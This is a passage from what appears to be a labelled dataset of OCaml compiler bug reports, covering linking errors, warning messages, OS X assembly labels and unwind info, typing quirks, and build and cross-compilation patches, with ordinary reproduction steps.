7141\n**Reporter:** @sliquister\n**Status:** acknowledged (set by @damiendoligez on 2016-02-25T13:24:13Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** compiler driver\n**Tags:** junior_job\n**Monitored by:** @diml @hcarty\n\n## Bug description\n\nWhen failing to run the c compiler at link time (in my case because\r\nthe command line is too big), ocamlopt just fails with this error:\r\n\r\n$ /tmp/script.sh \r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\n\r\nwhich is not super helpful. Even after adding -verbose, we still\r\ndidn't know what was failing and strac'ing was necessary.\r\n\r\nThis is because ocamlopt runs [Sys.command .. = 0], presumably relying\r\non the command to report an error. I think it would be preferable if\r\nthe Linking_error exception thrown in the false case could contain the\r\nexit code, and perhaps the program name, so the error could look like:\r\n\r\n$ /tmp/script.sh \r\nFile \"caml_startup\", line 1:\r\nError: Error during linking (exit code 127 from running g++)\n\n## Steps to reproduce\n\ncd /tmp\r\nrm -f a.cmx* b.cmx*\r\ntouch a.ml b.ml\r\nocamlopt -c a.ml\r\nocamlopt -ccopt \"$(printf \"%70000s\")\" -a a.cmx -o a.cmxa\r\nocamlopt -c b.ml\r\nocamlopt -ccopt \"$(printf \"%70000s\")\" -a b.cmx -o b.cmxa\r\nocamlopt a.cmxa b.cmxa -o out\n"},{"labels":["bug"],"text":"**Original bug ID:** 7139\n**Reporter:** @gasche\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2016-12-12T15:19:50Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.04.0\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @diml @hcarty\n\n## Bug description\n\nHaving the unused exception\r\n  exception Bad_magic_version of version\r\n\r\ngives the following error message\r\n  File \"utils/misc.ml\", line 660, characters 2-40:\r\n  Warning 38: unused extension constructor Bad_magic_version.\r\n\r\nI think that this is confusing for people that don't know about \"extension constructor\", and do not need to know about it. The error message should say\r\n\r\n  Warning 38: unused exception Bad_magic_version.\n\n## Steps to reproduce\n\n$ cat test.ml\r\nmodule M : sig end = struct\r\n  exception Foo of int\r\nend\r\n\r\n$ ocamlc -w +38 -c test.ml\r\nFile \"test.ml\", line 2, characters 2-22:\r\nWarning 38: unused extension constructor Foo.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7138\n**Reporter:** @trefis\n**Assigned to:** @lpw25\n**Status:** resolved (set by @gasche on 2018-05-11T20:33:55Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** lexing and parsing\n**Has duplicate:** #7701\n**Monitored by:** @hcarty\n\n## Bug description\n\nIf a .mli file contains nothing but a doc comment, warning 50 will trigger as the comment is considered unattached.\n\n## Additional information\n\nAdding code after the comment makes the warning go away.\r\n\r\nAdding only blank lines after the comment doesn't make the warning go away.\r\n\r\nAdding two (or more) blank lines before the comment makes the warning go away.\r\n\r\nAdding only one blank line before the comment doesn't make the warning go away.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7137\n**Reporter:** aalekseyev\n**Status:** closed (set by @mshinwell on 2016-12-09T11:39:19Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @lpw25 @hcarty\n\n## Bug description\n\nCurrently -open expects a module name, not a module path. This seems overly restrictive. Can we start supporting module paths?\n\n## Steps to reproduce\n\necho 'module B = struct let x = 8 end' > a.ml\r\necho 'let y = x' > c.ml\r\nocamlopt.opt -c a.ml\r\nocamlopt.opt -open A.B -c c.ml\n\n## Additional information\n\nOne might want to use a workaround [-open A -open B], but that additionally brings in scope other definitions from [A], which is not desirable.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7136\n**Reporter:** @yallop\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:48Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** standard library\n**Duplicate of:** #6719\n\n## Bug description\n\nThe documentation for Buffer.add_channel says:\r\n\r\n   Raise [End_of_file] if the channel contains fewer than [n]\r\n   characters. In this case, the characters are still added to\r\n   the buffer, so as to avoid loss of data.\r\n\r\nHowever, when End_of_file is raised the characters are not added to the buffer:\r\n\r\n   $ cat abc.txt \r\n   abc\r\n   $ ocaml\r\n\t   OCaml version 4.02.3\r\n\r\n   # let buf = Buffer.create 10;;\r\n   val buf : Buffer.t = <abstr>\r\n   # Buffer.add_channel buf (open_in \"abc.txt\") 10;;\r\n   Exception: End_of_file.\r\n   # Buffer.contents buf;;\r\n   - : string = \"\"\n"},{"labels":["bug"],"text":"**Original bug ID:** 7135\r\n**Reporter:** @yallop\r\n**Assigned to:** @garrigue\r\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:32:09Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Fixed in version:** 4.03.0+dev / +beta1\r\n**Category:** ~DO NOT USE (was: OCaml general)\r\n**Related to:** #7199\r\n**Monitored by:** @hcarty\r\n\r\n## Bug description\r\n\r\nThe following program causes OCaml to issue a warning\r\n```\r\n   $ cat princ.ml\r\n   module M : sig type t = private int end =\r\n   struct type t = int end\r\n   include M\r\n\r\n   let lift2 (f : int -> int -> int) (x : t) (y : t) =\r\n     f (x :> int) (y :> int)\r\n   $ ocamlc princ.ml\r\n   File \"princ.ml\", line 6, characters 15-25:\r\n   Warning 18: this ground coercion is not principal.\r\n```\r\nThis is surprising for several reasons.  First, in what sense is the coercion not principal?  Both the source and the target type are known.  Second, only one of the apparently-identical coercions is flagged as non-principal.  Third, changing 'include' to 'open' causes the warning to disappear.\r\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7133\n**Reporter:** bartjacobs\n**Status:** closed (set by @damiendoligez on 2016-02-10T14:26:25Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** tweak\n**Platform:** Mac\n**OS:** OS X\n**OS Version:** 10.10.1\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nOn OS X 10.10.1, the myriad jump labels (of the form .L101:) emitted into the assembly code by ocamlopt are included by the LLVM assembler as symbols into the object file, and thence by the OS X linker (ld64) into the executable. This is undesirable for at least the following reasons:\r\n- Various native backtrace generators, including the OS X crash log generator and lldb, will interpret each jump label as starting a new function, and show the nearest preceding jump label, instead of the actual function name, in the backtrace.\r\n- This also hurts the lldb experience in other ways. For example, when asking lldb to disassemble a function, it only shows the assembly code up to the first jump label.\r\n- It has space and time costs at build time and at load/run time.\n\n## Steps to reproduce\n\nEnter the following code into foo.ml:\r\n\r\n    let x: unit -> unit = Obj.magic ()\r\n    let () = x ()\r\n\r\nBuild foo:\r\n\r\n    ocamlopt -o foo -S foo.ml\r\n\r\nLoad foo into LLDB:\r\n\r\n    lldb ./foo\r\n\r\nRun it\r\n\r\n    run\r\n\r\nLLDB will stop at the segmentation fault. Ask for a backtrace:\r\n\r\n    bt\r\n\r\nThe backtrace will show the current function as foo`.L100 instead of the correct (and more informative) foo`camlFoo__entry .\n\n## Additional information\n\nThe problem is solved by dropping the dot from the jump label names.\r\n\r\nThis can be confirmed easily for the abovementioned foo.ml example, as follows:\r\n\r\nGenerate an assembly code file for foo.ml:\r\n\r\n    ocamlopt -c -S foo.ml\r\n\r\nEdit foo.s and replace each occurrence of .Lnnn by Lnnn (i.e. remove the dots).\r\n\r\nCompile the assembly file:\r\n\r\n    clang -arch x86_64 -c foo.s\r\n\r\nBuild the executable:\r\n\r\n    ocamlopt -o foo foo.cmx\r\n\r\nLoad the executable into LLDB:\r\n\r\n    lldb ./foo\r\n\r\nRun the executable:\r\n\r\n    run\r\n\r\nAsk for a backtrace:\r\n\r\n    bt\r\n\r\nNotice that the current function is now correctly identified as foo`camlFoo__entry .\r\n\r\nExplanation: the LLVM assembler seems to treat labels that start with the letter 'L' specially: it considers them local to the file and does not emit them as symbols into the object file.\r\n\r\nFix: dropping the dot from the label names is a single-line fix function emit_label in asmcomp/amd64/emit.mlp.\r\n\r\nComplication: by itself, the above fix does not work; in particular, programs for which ocamlopt generates jump tables cause the OS X linker (ld64) to fail.\r\n\r\nTo see this, create file bar.ml with the following contents:\r\n\r\n    let x: int -> unit = Obj.magic ()\r\n\r\n    let () =\r\n        match (Obj.magic (): int) with\r\n        | 0 -> x 1\r\n        | 1 -> x 0\r\n        | 2 -> x 20\r\n        | 3 -> x 30\r\n\r\nGenerate assembly code for this program into bar.s:\r\n\r\n    ocamlopt -c -S bar.ml\r\n\r\nEdit the assembly code file bar.s: replace each .Lnnn by Lnnn. In vi:\r\n\r\n    :1,$s/\\.L/L/g\r\n    :wq\r\n\r\nCompile the assembly code file:\r\n\r\n    clang -c -arch x86_64 bar.s\r\n\r\nBuild the executable:\r\n\r\n    ocamlopt -o bar bar.cmx\r\n\r\nThis produces the following error message:\r\n\r\n    ld: in section __TEXT,__const reloc 0: X86_64_RELOC_SUBTRACTOR must have r_extern=1 file 'bar.o' for architecture x86_64\r\n\r\nExplanation: for the match expression in bar.ml, ocamlopt generates the following jump table into bar.s:\r\n\r\n        .section __TEXT,__const\r\n        .align  2\r\n.L108:\r\n        .long   .L104 - .L108\r\n        .long   .L103 - .L108\r\n        .long   .L102 - .L108\r\n        .long   .L101 - .L108\r\n        .text\r\n.L104:\r\n\r\nAfter replacing .L by L, the LLVM assembler still generates relocation entries for these subtractions, even though the labels are now local. This is because the labels for the cases (L101, L102, L103 and L104) are in the .text section, whereas the expression occurs in the __TEXT,__const section. The linker fails on this relocation entry mentioning a local label.\r\n\r\nFix: Dropping the .section __TEXT,__const directive fixes the problem. It does not seem to be required (anymore) on OS X.\r\n\r\nI have prepared a patch and will create a pull request.\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7132\n**Reporter:** @damiendoligez\n**Assigned to:** @mshinwell\n**Status:** assigned (set by @mshinwell on 2016-12-08T09:49:26Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**OS:** openBSD\n**Version:** 4.03.0+dev / +beta1\n**Category:** runtime system and C interface\n\n## Bug description\n\nThe testsuite hangs on openBSD. The culprit is tests/lib-systhreads/testfork.ml.\r\n\r\nPreliminary investigations seem to indicate that the process is looping within the C runtime's \"exit\" function, with a stack trace that contains stuff related to pthread_atfork.\n"},{"labels":["bug"],"text":"**Original bug ID:** 7131\n**Reporter:** dobenour\n**Status:** closed (set by @mshinwell on 2016-12-07T15:49:04Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Target version:** 4.03.1+dev\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nOCaml's compilers currently dies with an uncaught exception in certain cases that are due to user error.  It should not be possible to cause this to happen except through resource exhaustion or unsafe OCaml code (such as misusing Obj).\n\n## Additional information\n\nGHC tells users to file a bug report when an internal error is detected\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7130\n**Reporter:** berke.durak\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2017-03-15T06:07:41Z)\n**Resolution:** not a bug\n**Priority:** low\n**Severity:** minor\n**Platform:** x86_64\n**OS:** Linux\n**OS Version:** Debian (jessie)\n**Version:** 4.02.2\n**Target version:** later\n**Category:** typing\n\n## Bug description\n\nOne generally expects that if code compiles with stricter options, it will also compile with more lax options, but this is not the case with -strict-sequence.\n\n## Steps to reproduce\n\n% ocaml                 \r\n        OCaml version 4.02.2\r\n\r\n# class bar = object method foo f  = f (); 123 end;;\r\nError: Some type variables are unbound in this type:\r\n         class bar : object method foo : (unit -> 'a) -> int end\r\n       The method foo has type (unit -> 'a) -> int where 'a is unbound\r\n \r\n\r\n% ocaml -strict-sequence\r\n        OCaml version 4.02.2\r\n\r\n# class bar = object method foo f  = f (); 123 end;;\r\nclass bar : object method foo : (unit -> unit) -> int end\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7128\n**Reporter:** @stedolan\n**Status:** acknowledged (set by @damiendoligez on 2016-02-03T11:00:36Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** later\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche @hcarty\n\n## Bug description\n\nThe ref_table is added to whenever a pointer is created from the old to the young generation. Unfortunately, this can happen an unbounded number of times between two safepoints, since safepoints are only at allocations in the native compiler.\r\n\r\nThe attached program runs using less than 1MB of memory with the bytecode interpreter. However, when compiled with ocamlopt, it allocates 4GB of ref_table and then crashes, as ocamlopt must wait for a safepoint to clear the ref_table.\n\n## File attachments\n\n- [safepoints.ml](https://gist.githubusercontent.com/vicuna/026393a6a554daad799a463dbc6dd5e1/raw/0cc8f7e4622b8e7f88c07c3b3ba1be5310c113db/safepoints.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7125\n**Reporter:** erwan\n**Status:** closed (set by @xavierleroy on 2017-02-16T13:34:37Z)\n**Resolution:** not fixable\n**Priority:** normal\n**Severity:** minor\n**Platform:** amd64\n**OS:** Debian\n**OS Version:** 3.16.7\n**Version:** 4.02.3\n**Category:** -for CamlIDL use https://github.com/xavierleroy/camlidl/issues\n**Tags:** patch\n\n## Bug description\n\nError: The external function `camlidl_com_initialize' is not available\n\n## Steps to reproduce\n\nopam install camlidl\r\nocaml\r\n #use \"topfind\";;\r\n # require \"camlidl\";;\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7122\n**Reporter:** adrien\n**Status:** acknowledged (set by @damiendoligez on 2016-02-08T11:39:07Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** configure and build/install\n**Tags:** cross-compilation, patch\n\n## Bug description\n\nTogether with #7121, this is basically the last patches that I've needed in order to get a cross-compiler to Windows when updating to trunk (my non-trivial GUI + threads program works, meaning enough is supported; not everything is however).\r\n\r\nThis one is very simple: in otherlibs/systhreads/Makefile, there is a couple of -I that hardcode their path to $(ROOTDIR)/otherlibs/unix and this simply changes the paths to $(ROOTDIR)/otherlibs/$(UNIXLIB) (i.e. either \"unix\" or \"win32unix\").\r\n\r\nThinking more about it, it might read better to replace the use of \"$(UNIXLIB)\" with \"$(IS_WIN32)unix\" where IS_WIN32 is either \"win32\" or \"\". That's something that would be done later on however.\n\n## File attachments\n\n- [0001-systhreads-allow-usage-of-win32unix-when-using-non-..patch](https://gist.githubusercontent.com/vicuna/adc4296873a2b68a3908735086d6c591/raw/3371e2db847ecee9abc54e4c7a399334cc402c51/0001-systhreads-allow-usage-of-win32unix-when-using-non-..patch)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7121\n**Reporter:** adrien\n**Status:** acknowledged (set by @damiendoligez on 2016-02-08T11:38:08Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** configure and build/install\n**Tags:** cross-compilation, patch\n\n## Bug description\n\nCurrently, the ${partialld} variable in configure is either provided or guessed as \"ld -r\" or \"ld -r -arch ppc64/x86_64\" or \"ld -r -m elf_x86_64\". For cross-compilation, something starting with \"${TARGET_TRIPLET}-ld\" is needed.\r\n\r\nThe following diff, which I'm not very happy with, solves the issue for me:\r\n\r\n  diff --git a/configure b/configure\r\n  index e5ae7a5..0fd96b5 100755\r\n  --- a/configure\r\n  +++ b/configure\r\n  @@ -884,6 +884,7 @@ case \"$arch,$nativecc,$system,$model\" in\r\n     power,gcc*,elf,ppc)   partialld=\"ld -r -m elf32ppclinux\";;\r\n     power,gcc*,elf,ppc64)   partialld=\"ld -r -m elf64ppc\";;\r\n     power,gcc*,elf,ppc64le)   partialld=\"ld -r -m elf64lppc\";;\r\n  +  *,*gcc*,*,*)         partialld=\"${target}-ld -r\";;\r\n   esac\r\n  \r\n   asppprofflags='-DPROFILING'\r\n\r\nIf the user has provided the value for partialld on the ./configure command-line, the value can get overwritten (this is already the case). The current case/in/esac construct also seems to have grown quite organically.\r\n\r\nDoes anyone know whether the architectures in the list (nextstep, rhapsody, mac os x amd64, solaris amd64, linux ppc32, ppc64, ppc64le) are supported and whether they come with prefixed toolchains.\r\n\r\nStrictly speaking, binutils can support various file formats. For instance, slackware64 doesn't ship a 32-bits nor windows toolchains but its binutils have been configured to handle the corresponding executables (I guess that some maintainers like to play with old games [ or UEFI but that's less likely :) ]). However, it seems unlikely someone would rely on that to build OCaml and figuring out the values to -m or -arch is very difficult (and probably impossible to automate in a sane way). Therefore, trying to prefixed tools seems like the best option to me.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7120\n**Reporter:** bartjacobs\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-03-08T13:36:32Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** back end (clambda to assembly)\n**Related to:** #7118\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nocamlopt (at least sometimes, perhaps always) generates an extra .cfi_adjust_cfa_offset directive between ret and .cfi_endproc at the end of an assembly routine. (.cfi_xxx directives generate DWARF stack unwinding information. This information enables debuggers such as LLDB to produce a stack backtrace even for code that does not adhere to the classical stack frame layout with base pointers. It is also used by the runtime system of certain programming languages, including C++ and Objective-C, to walk and unwind the stack for exception handling.)\r\n\r\nThis causes the .cfi_adjust_cfa_offset directives to not be pairwise balanced, i.e. this extra directive does not have a counterpart that cancels it out.\r\n\r\nThe resulting unwind info causes some programs interpreting this info (at least Apple's libunwind 35.3 on OS X 10.10.1, perhaps other consumers on other systems as well) to take the directive into account for subsequent assembly routines, causing the CFA offsets to accumulate and be incorrect for these subsequent routines.\r\n\r\nThe consequences are truncated call stacks in LLDB. But more importantly, this can lead to crashes if OCaml code calls into code that performs stack walks to find exception handlers. For example, Cocoa (the OS X GUI library) triggers such stack walks. See also bug 7118.\n\n## Steps to reproduce\n\nUnzip the attached archive. Then:\r\nmake\r\nlldb ./driver\r\nbreak set -n camlMylib__bar_1223  # The number is non-deterministic. Check mylib.s for the right value.\r\nrun\r\nbt # Observe that the backtrace is not correct: at this point there are really at least 10 stack frames: dylib`start -> main -> caml_main -> caml_start_program -> caml_program -> camlDriver__entry -> caml_apply11 -> camlMylib__foo1 -> caml_apply10 -> camlMylib__bar\r\ntarget modules show-unwind -n camlMylib__foo1_1199\r\ntarget modules show-unwind -n camlMylib__foo2_1211\r\ntarget modules show-unwind -n camlMylib__bar_1223\r\n\r\nThe unwind info shown for foo1 is correct. Notice, however, that the unwind info shown for foo2 is different from that shown for foo1, even though these two OCaml functions have identical bodies and identical assembly routines. The info for foo2 is incorrect. The extra .cfi_adjust_cfa_offset value specified at the end of the assembly routine for foo1 has been accumulated onto the CFA offsets for foo2.\n\n## File attachments\n\n- [unwind-bug-repro.zip](https://gist.githubusercontent.com/vicuna/9491b276e99b5e4e9cfed7071dadd60f/raw/b6fa731412ff8814faec48bfe002233d658f313a/unwind-bug-repro.zip)\n"},{"labels":["bug"],"text":"**Original bug ID:** 7119\n**Reporter:** @Drup\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:44Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Monitored by:** @Drup @hcarty\n\n## Bug description\n\nThis is reproducible both in 4.02.3 and trunk.\r\n\r\nIn this piece of code:\r\n\r\n    [@@@warning \"-3\"]\r\n    let x = String.set \"a\" 0 'a'\r\n\r\n\"ocamlc foo.ml\" reports no warning.\r\n\"ocaml foo.ml\" reports a warning.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7118\n**Reporter:** bartjacobs\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2016-03-08T13:36:16Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.1\n**Target version:** 4.03.1+dev\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** back end (clambda to assembly)\n**Related to:** #7120\n**Monitored by:** @gasche\n\n## Bug description\n\nIt seems that Objective-C code sometimes performs a stack walk as part of its happy-path normal operation; such stack walks seem to sometimes crash on ocamlopt-generated stack frames.\r\n\r\nEvidence for this is that my tool, VeriFast, has been crashing recently. See the attached crash report. VeriFast uses GTK through lablgtk for its GUI. On my OS X machine, I can make VeriFast 15.12 crash reliably (see below). Apparently, the sequence of events is as follows:\r\n- VeriFast calls into lablgtk\r\n- lablgtk calls into GTK\r\n- GTK calls into Cocoa (AppKit)\r\n- AppKit calls into the Objective-C runtime to add an exception handler.\r\n- The runtime wants to find the innermost enclosing stack frame that handles Objective-C exceptions. It uses Apple's libunwind implementation to walk the stack to find such a frame.\r\n- libunwind crashes while advancing the stack walking cursor.\r\n\r\nI haven't been able to verify yet that the stack frame that libunwind crashes on is an ocamlopt-generated stack frame (I don't have debug symbols for libunwind and interpreting the machine state manually is a bit daunting), but that seems likely, given that ocamlopt-generated code generates unusually-shaped stack frames.\r\n\r\nNote: initially, I though the problem manifested only when calling ocamlopt without the -g option, but recently, I'm seeing the crashing even with VeriFast 15.12, which is built with the -g option.\r\n\r\nUnfortunately, it does not seem to be the case that libunwind always crashes on ocamlopt-generated stack frames. Apparently, it only does sometimes. For example, if I run VeriFast IDE inside a debugger (lldb), I don't get crashes. (I can only investigate the problem by generating a core dump.)\r\n\r\nAssuming that it is indeed the case that libunwind crashes on ocamlopt-generated stack frames, there seem to be a number of possible solutions:\r\n- Modify ocamlopt so that it generates stack frames that libunwind doesn't crash on\r\n- Modify ocamlopt so that on OS X it generates stack walking backstops when calling into external functions. \r\n- Modify libunwind so that it doesn't crash.\r\n- Modify lablgtk so that it generates stack walking backstops.\r\n- Modify GTK so that it generates stack walking backstops when calling into Cocoa.\r\n- Modify the Objective-C runtime so that it doesn't walk the stack when adding an exception handler.\r\n- Modify the Objective-C compiler so that it generates a stack walking backstop when C code calls Objective-C code.\n\n## Steps to reproduce\n\n(This works on my machine reliably, but it seems rather brittle so it might not work on your machine.)\r\n1. Download VeriFast 15.12 for OS X from http://www.cs.kuleuven.be/~bartj/\r\n2. Unzip the tarball.\r\n3. Run 'bin/vfide examples/termination/ackermann.c'\r\n4. Issue the Verify command, either by clicking the Play toolbar button, pressing F5, or choosing the Verify menu item.\r\nVeriFast crashes after verification finishes, when it tries to scroll to the error location.\n\n## Additional information\n\nI have also filed the following bugs:\r\n- lablgtk bug 1518 (https://forge.ocamlcore.org/tracker/index.php?func=detail&aid=1518&group_id=220&atid=1032)\r\n- GTK bug 759278 (https://bugzilla.gnome.org/show_bug.cgi?id=759278)\r\n- Apple bug 24076902 (https://bugreport.apple.com/problem/viewproblem)\n\n## File attachments\n\n- [vfide-core_2016-01-05-192723_Bart-Jacobss-MacBook-Pro.crash](https://gist.githubusercontent.com/vicuna/c3658d2253d8d6aeca32a329ed0427be/raw/b5ea9638d520c1011b3a261d3cb63e7f47ef18b3/vfide-core_2016-01-05-192723_Bart-Jacobss-MacBook-Pro.crash)\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7117\n**Reporter:** michi\n**Status:** confirmed (set by @damiendoligez on 2016-02-08T11:35:48Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n\n## Bug description\n\nIn my project using extension points, ocamldep is unable to generate appropriate dependencies when code contain extension points. I remarked that, when not told to use the necessary PPX filters, ocamldep skips expressions within an extension point.\r\n\r\nThis is perfectly sound but this is neither described in the man page (4.02.3) nor on the website[1], but it should be described in both.\r\n\r\nAlso, at the time of writing, the content of the page [1] describing the use of ocamldep is out of sync with the man page and does not mention the possible use of PPX filters.\r\n\r\n\r\n  [1] http://caml.inria.fr/pub/docs/manual-ocaml/depend.html\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7115\n**Reporter:** @sliquister\n**Assigned to:** @alainfrisch\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:43Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following code:\r\n\r\ntype t = A : t\r\nlet _apply_implementation t ~x =\r\n  match t with\r\n  | A -> let x = () in x\r\n\r\nshould complain about \"unused variable x\" but doesn't.\r\nIf instead [t] is defined as [type t = A], or if the two [x] variables are given different names, then we get:\r\n\r\n$ ocamlopt -w +a /tmp/a.ml\r\nFile \"/tmp/a.ml\", line 2, characters 29-30:\r\nWarning 27: unused variable x.\r\n\r\nas expected.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7112\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** closed (set by @lpw25 on 2017-02-27T14:48:45Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.04.0\n**Category:** typing\n**Has duplicate:** #7204\n**Monitored by:** @gasche @diml @yallop\n\n## Bug description\n\nModule aliases are not taken account of in arguments to functors when checking equality of abstract module types:\r\n\r\n  # module F (_ : sig end) = struct module type S end;;\r\n  module F : functor (_ : sig  end) -> sig module type S end\r\n\r\n  # module M = struct end;;\r\n  module M : sig  end\r\n\r\n  # module N = M;;\r\n  module N = M\r\n\r\n  # module G (X : F(N).S) : F(M).S = X;;\r\n  Characters 33-34:\r\n    module G (X : F(N).S) : F(M).S = X;;\r\n                                     ^\r\n  Error: Signature mismatch:\r\n         Modules do not match: F(N).S is not included in F(M).S\r\n         Unbound module type F(M).S\n"},{"labels":["bug"],"text":"**Original bug ID:** 7111\n**Reporter:** leonidr\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:47Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.02.3\n**Target version:** 4.03.0+dev / +beta1\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #7002\n**Monitored by:** @hcarty\n\n## Bug description\n\nSee steps below. I've tried it with various type declarations; all of the ones on the ppx_deriving documentation.\n\n## Steps to reproduce\n\n$ cat test.ml \r\ntype a = Foo [@@deriving show]\r\n$ PPD=`ocamlfind query ppx_deriving`\r\n$ ocamlc -c -I $PPD -ppx \"$PPD/ppx_deriving $PPD/ppx_deriving_show.cma\" -dsource test.ml 2> test_part2.ml\r\n$ echo $?\r\n0\r\n$ cat test_part2.ml \r\ntype a =\r\n  | Foo[@@deriving show]\r\nlet rec pp_a : Format.formatter -> a -> Ppx_deriving_runtime.unit=\r\n   in\r\n  ((let open! Ppx_deriving_runtime in\r\n      fun fmt  -> function | Foo  -> Format.pp_print_string fmt \"Test.Foo\")\r\n    [@ocaml.warning \"-A\"])\r\nand show_a : a -> Ppx_deriving_runtime.string=\r\n  fun x  -> Format.asprintf \"%a\" pp_a x\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7109\n**Reporter:** @edwintorok\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-02-16T14:18:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** documentation\n\n## Bug description\n\nhttp://caml.inria.fr/pub/docs/manual-ocaml-4.01/libref/Bigarray.html#TYPEkind vs\r\nhttp://caml.inria.fr/pub/docs/manual-ocaml-4.02/libref/Bigarray.html#TYPEkind\r\n\r\nIn 4.02 the comment seems to be associated with the last variant, and not the type as the whole, and the documentation is rendered in an unpleasant way\n\n## Additional information\n\nFrom #ocaml:\r\noctachron: edwin, as an information complement, the problem is with the new association rule for docstring comment on constructors\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7108\n**Reporter:** @Armael\n**Assigned to:** @gasche\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:40Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** tweak\n**Fixed in version:** 4.03.0+dev / +beta1\n**Category:** ocamldoc\n**Monitored by:** @Armael\n\n## Bug description\n\nThis is a known (and documented) behavior: standard generators, loaded with e.g. the -html, -latex, ... options, override custom generators provided with option -g. This is a bit inconvenient, at least when using custom generators with ocamlbuild (see for example https://github.com/Armael/ocaml-libudev/blob/master/myocamlbuild.ml#L40 or https://github.com/ocsigen/tyxml/blob/master/myocamlbuild.ml#L57 for a workaround). gasche suggested (https://github.com/ocaml/ocamlbuild/issues/10#issuecomment-166849495) that the cleanest solution could be to change ocamldoc's behavior regarding this.\r\n\r\nI could submit a PR where custom generators would always be loaded after standard ones, if this sounds like a satisfying solution.\n\n## File attachments\n\n- [generators2.patch](https://gist.githubusercontent.com/vicuna/51f17a1e4048c867d1fdd3b39f83fa92/raw/47776ccf04f2baf183149165edb72412ff25ac84/generators2.patch)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7107\n**Reporter:** furuse\n**Assigned to:** @garrigue\n**Status:** closed (set by @xavierleroy on 2017-09-24T15:31:48Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Version:** 4.02.3\n**Category:** typing\n**Related to:** #3231\n\n## Bug description\n\nclass type ct = object method x : int end\r\n\r\nclass c : ct = object method private x = 1 end\r\n\r\nclass c' = object method virtual m : int method private m = 1 end\r\n\r\nThe classes c and c' have public methods, though their implementations are declared private.  Issue 3231 